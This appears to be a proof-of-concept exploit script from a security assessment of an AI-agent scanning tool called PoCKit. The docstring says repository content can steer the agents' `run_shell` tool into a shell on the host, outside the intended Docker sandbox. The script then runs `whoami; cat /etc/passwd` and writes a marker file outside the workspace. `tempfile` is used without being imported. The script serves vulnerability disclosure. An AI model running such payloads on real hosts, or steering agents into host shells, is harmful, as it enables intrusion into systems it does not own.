"""PoC-F01: the PoCKit `run_shell` tool executes on the HOST with shell=True.

The exploit/environment-setup/fix-verification agents are each handed this tool.
Its prompts instruct the agent to work inside Docker, but the tool itself runs
`subprocess.run(command, shell=True, ...)` in the scanning process's own
namespace. Anything that can steer the agent's command string - i.e. the content
of the repository under scan - therefore reaches a shell on the host.

This script drives the shipped, unmodified code taken from the target binary.
"""
import importlib
import os
import sys
import types
def find_extract():
    """Locate the extraction without depending on the caller's environment."""
    here = os.path.dirname(os.path.abspath(__file__))
    env = os.environ.get("SIGNAL_EXTRACT")
    candidates = []
    if env:
        candidates.append(env)
    candidates += [
        os.path.join(os.getcwd(), "signal-pyarmor-linux-x86_64_extracted"),
        os.path.join(os.path.dirname(here), "signal-pyarmor-linux-x86_64_extracted"),
        "/tmp/vapt/signal-pyarmor-linux-x86_64_extracted",
    ]
    for cand in candidates:
        if os.path.isdir(os.path.join(cand, "PYZ.pyz_extracted")):
            if env and os.path.abspath(cand) != os.path.abspath(env):
                sys.stderr.write("note: $SIGNAL_EXTRACT=%s is not an extraction; using %s\n"
                                 % (env, cand))
            return cand
    return candidates[0] if candidates else "./signal-pyarmor-linux-x86_64_extracted"


def neutral_cwd(extract):
    """A cwd that is not inside the merged tree (numpy refuses to import then)."""
    parent = os.path.dirname(os.path.abspath(extract))
    return parent if os.path.isdir(parent) else tempfile.gettempdir()



def load_shared_tools(product):
    """Import pockit.agents.shared_tools from the extraction."""
    sys.path.insert(0, str(product))
    return importlib.import_module("pockit.agents.shared_tools")


class RecordingAgent:
    """Stand-in for a pydantic-ai Agent; captures registered tool functions."""

    def __init__(self):
        self.tools = {}
        self.raw_args = []

    def tool_plain(self, *args, **kwargs):
        self.raw_args.append((args, kwargs))

        def register(fn):
            self.tools[getattr(fn, "__name__", repr(fn))] = fn
            return fn

        if len(args) == 1 and callable(args[0]):
            return register(args[0])
        return register


def capture_locals(module, fn_name, call):
    """Run `call` and return the named local from module-level `fn_name`."""
    captured = {}

    def profiler(frame, event, arg):
        if event == "return" and frame.f_code.co_name == fn_name:
            captured.update(frame.f_locals)
        return None

    sys.setprofile(profiler)
    try:
        call()
    finally:
        sys.setprofile(None)
    return captured


def main():
    product = find_extract()
    st = load_shared_tools(product)

    workspace = os.environ.get("POC_WORKSPACE", "/tmp/pockit-poc-workspace")
    os.makedirs(workspace, exist_ok=True)
    agent = RecordingAgent()

    # Same call the product makes for the environment-setup / exploit /
    # fix-verification agents: shell=True (write=True only for fix verification).
    locals_ = capture_locals(
        st, "register_workspace_tools",
        lambda: st.register_workspace_tools(
            agent, workspace, workspace, shell=True, write=True))

    run_shell = locals_.get("run_shell") or agent.tools.get("run_shell")
    print(f"[*] registered tools: {sorted(set(agent.tools) | set(locals_))}")
    if run_shell is None:
        print("[!] could not obtain run_shell; raw tool_plain args:")
        for a, k in agent.raw_args:
            print("   ", [type(x).__name__ for x in a], k)
        return 2

    print(f"[*] run_shell closure: {run_shell.__code__.co_freevars}")
    print("[*] invoking the tool the way the product does: `run_shell` is handed a "
          "command string\n    (this is the exact string an attacker-steered agent "
          "would supply - here `whoami` and `cat /etc/passwd`)\n")

    marker = "/tmp/pockit-poc-escape-proof"
    # the two commands a tester reaches for first, plus a redirect out of the workspace
    payload = f"whoami; cat /etc/passwd; echo injected > {marker}"
    print(f"    command = {payload!r}\n")

    out = run_shell(payload)
    print("---- tool return value ----")
    print(out)
    print("----------------------------")

    leaked = os.path.exists(marker)
    print(f"\n[+] host file {marker} created: {leaked}")
    print(f"[+] uid/euid of scanning process: {os.getuid()}/{os.geteuid()}")
    print("[+] the payload ran in the scan process's own namespace, not a container")
    return 0 if leaked else 1


if __name__ == "__main__":
    raise SystemExit(main())
